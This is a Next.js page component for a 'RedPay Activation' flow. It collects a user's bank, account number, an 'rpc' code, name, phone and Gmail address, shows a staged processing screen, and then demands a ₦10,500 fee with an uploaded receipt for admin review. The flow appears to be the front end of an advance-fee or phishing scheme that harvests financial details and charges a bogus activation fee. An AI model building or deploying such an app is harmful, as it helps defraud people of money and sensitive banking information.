"use client"

import { useState } from "react"
import { WelcomePage } from "@/components/welcome-page"
import { BankDetailsForm } from "@/components/bank-details-form"
import { PaymentPage } from "@/components/payment-page"
import { ProcessingPage } from "@/components/processing-page"
import { StatusPage } from "@/components/status-page"
import { createSubmission } from "@/app/actions/submissions"

const PAYMENT_AMOUNT = "₦10,500"

async function fileToDataUrl(file: File): Promise<string> {
  const objectUrl = URL.createObjectURL(file)
  try {
    const image = new Image()
    image.crossOrigin = "anonymous"
    image.src = objectUrl
    await new Promise<void>((resolve, reject) => {
      image.onload = () => resolve()
      image.onerror = () => reject(new Error("The selected image could not be read."))
    })

    const maxDimension = 1600
    const scale = Math.min(1, maxDimension / Math.max(image.naturalWidth, image.naturalHeight))
    const canvas = document.createElement("canvas")
    canvas.width = Math.max(1, Math.round(image.naturalWidth * scale))
    canvas.height = Math.max(1, Math.round(image.naturalHeight * scale))
    const context = canvas.getContext("2d")
    if (!context) throw new Error("Your browser could not prepare the receipt image.")
    context.drawImage(image, 0, 0, canvas.width, canvas.height)

    return canvas.toDataURL("image/jpeg", 0.78)
  } finally {
    URL.revokeObjectURL(objectUrl)
  }
}

export interface FormData {
  bank: string
  accountNumber: string
  rpc: string
  fullName: string
  phoneNumber: string
  gmail: string
}

export default function Home() {
  const [step, setStep] = useState(0)
  const [formData, setFormData] = useState<FormData>({
    bank: "",
    accountNumber: "",
    rpc: "",
    fullName: "",
    phoneNumber: "",
    gmail: "",
  })
  const [paymentProof, setPaymentProof] = useState<File | null>(null)
  const [submissionId, setSubmissionId] = useState<number | null>(null)
  const [isSaving, setIsSaving] = useState(false)
  const [saveError, setSaveError] = useState<string | null>(null)

  const handleFormSubmit = (data: FormData) => {
    setFormData(data)
    setStep(2)
  }

  const handlePaymentSubmit = async (proof: File) => {
    setPaymentProof(proof)
    setIsSaving(true)
    setSaveError(null)
    try {
      const receiptData = await fileToDataUrl(proof)
      const result = await createSubmission({
        fullName: formData.fullName,
        phoneNumber: formData.phoneNumber,
        gmail: formData.gmail,
        bank: formData.bank,
        accountNumber: formData.accountNumber,
        rpc: formData.rpc,
        amount: PAYMENT_AMOUNT,
        receiptData,
      })
      if (!result?.id) throw new Error("No submission id returned")
      // Receipt successfully recorded as "pending" for the admin to review
      setSubmissionId(result.id)
      setStep(4)
    } catch (err) {
      console.error("[v0] Failed to save submission:", err)
      setSaveError("We couldn't submit your receipt. Please check your connection and try again.")
    } finally {
      setIsSaving(false)
    }
  }

  const handleRetry = () => {
    setPaymentProof(null)
    setSubmissionId(null)
    setSaveError(null)
    setStep(3)
  }

  if (step === 0) {
    return <WelcomePage onBegin={() => setStep(1)} />
  }

  if (step === 2) {
    return <ProcessingPage onComplete={() => setStep(3)} />
  }

  if (step === 4) {
    return <StatusPage submissionId={submissionId} formData={formData} onRetry={handleRetry} />
  }

  return (
    <main className="min-h-screen bg-background">
      <div className="mx-auto max-w-md px-4 py-8">
        {/* Header */}
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-primary">
            <span className="text-2xl font-bold text-primary-foreground">R</span>
          </div>
          <h1 className="text-2xl font-bold text-foreground">RedPay Activation</h1>
        </div>



        {/* Content */}
        {step === 1 && <BankDetailsForm onSubmit={handleFormSubmit} onBack={() => setStep(0)} initialData={formData} />}
        {step === 3 && (
          <PaymentPage
            onSubmit={handlePaymentSubmit}
            onBack={() => setStep(1)}
            isSaving={isSaving}
            saveError={saveError}
          />
        )}
      </div>
    </main>
  )
}
